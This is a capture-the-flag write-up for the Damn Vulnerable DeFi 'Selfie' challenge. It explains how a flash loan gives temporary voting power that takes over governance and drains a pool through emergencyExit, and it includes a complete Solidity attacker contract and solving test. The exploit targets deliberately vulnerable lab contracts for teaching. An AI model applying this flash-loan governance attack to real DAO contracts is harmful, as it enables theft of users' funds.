# Selfie Challenge 

## Statement:

<img width="878" height="446" alt="image" src="https://github.com/user-attachments/assets/ec2b9294-f720-4ead-a99a-5c45d7ac76ee" />


## 1. How the Contracts Work

### 🏛 SimpleGovernance
The governance contract allows token holders to **queue** and later **execute** actions.  
Key mechanics:

- Voting power = delegated token balance at the time of `queueAction`.
- No snapshotting → voting power can be manipulated within the same block.
- Queued actions can only be executed **after a 2-day delay**.
- If you temporarily have the majority of tokens, you can queue any action you want.

This means:  
**Temporary token ownership = temporary governance control.**

---

### 💰 SelfiePool
The pool stores a huge amount of governance tokens and supports ERC-3156 flash loans.

Important functions:

- `flashLoan()`  
  Gives a large number of tokens and expects them back in the same transaction.
- `emergencyExit(address)`  
  Sends *all pool tokens* to a chosen address, but only governance can call it.

Governance controls this function → if governance is compromised, the pool can be drained instantly.

---

### 🗳 DamnValuableVotes (DVT)
This token uses delegation:

- Holding tokens is not enough — you must call `delegate()` to activate voting power.
- Whoever has more than 50% delegated voting power can queue governance actions.

Because flash loans give you temporary tokens, you can temporarily gain majority voting power after delegating.

---

## 2. How the Attack Works

The vulnerability:  
> Governance uses *current* token balance instead of a snapshot.

Flash loans allow an attacker to manipulate voting power only for the duration of one transaction.

### 🚀 Attack Steps

#### **1 — Take a flash loan**
Borrow 1,500,000 DVT (the entire pool).  
This instantly gives you majority of the total supply.

#### **2 — Delegate voting power**
```solidity
token.delegate(address(this));
```

#### **3 — Queue a malicious action**

Use your temporary voting power to create a governance action:

``` solidity
governance.queueAction(
    address(pool),
    0,
    abi.encodeWithSignature("emergencyExit(address)", recovery)
);
```

This will, after 2 days, transfer all pool tokens to your address.

#### **4 — Repay the flash loan**

Approve the pool to take the tokens back.
Flash loan completed successfully.

#### **5 — Wait 2 days**

The governance contract enforces a delay before actions become executable.

#### **6 — Execute the proposal**

```governance.executeAction(actionId);```

This triggers:

```SelfiePool.emergencyExit(recovery)```


→ all tokens are sent to your recovery address.

Pool drained.

## 3. Why This Vulnerability Exists

- ❌ No snapshot mechanism

Governance checks your token balance at proposal time, not at an earlier immutable block.

- ❌ Flash loans temporarily inflate voting power

You don't need to own tokens — you can borrow them for one transaction.

- ❌ Delegation takes effect instantly

Borrow → delegate → gain full voting power in the same block.

- ❌ Dangerous admin function behind governance

emergencyExit() can transfer all funds anywhere.

Combining these design mistakes creates a governance takeover attack.


## Full Attack Code:


``` solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfieAttacker selfieAttacker = new SelfieAttacker(
            address(token),
            address(governance),
            address(pool),
            recovery
        );
        selfieAttacker.startAttack();
        vm.warp(block.timestamp + 2 days);
        selfieAttacker.executeProposal();
        
    }
```
### Attacker Contract:

``` solidity
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _token,
        address _governance,
        address _pool,
        address _recovery
    ){
        token = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        recovery = _recovery;
    }

    function startAttack() external{
        pool.flashLoan(
            IERC3156FlashBorrower (address(this)), 
            address(token), 
            1_500_000 ether, 
            "");
    }

    function onFlashLoan(
        address _initiator,
        address /*_token*/,
        uint256 _amount,
        uint256 _fee,
        bytes calldata /*data*/
    ) external returns(bytes32){

        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");

        token.delegate(address(this));

        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        actionId = _actionId;

        token.approve(address(pool), _amount+_fee);

        return CALLBACK_SUCCESS;

    }

    function executeProposal() external{

        governance.executeAction(actionId);

    }

}
```

